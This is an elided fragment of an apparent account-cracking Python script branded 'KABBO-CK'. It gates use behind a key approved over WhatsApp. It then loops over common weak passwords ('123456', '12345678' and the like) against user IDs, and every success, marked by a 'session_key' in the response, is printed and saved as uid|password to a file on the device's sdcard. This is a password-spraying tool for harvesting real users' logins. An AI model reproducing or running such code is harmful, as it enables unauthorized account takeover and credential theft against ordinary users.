...
''')
    ...
    try:
        ...
        if f"KABBO-CK-{key}" in response:
            ...
            os.system(f'xdg-open https://wa.me/+923229120975?text=Mera-Key-Approve-Kardo-KABBO-CK-{key}')
            sys.exit()
    except:
        sys.exit()
    ...
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKABBO-CK-M1\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/KABBO-CK-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
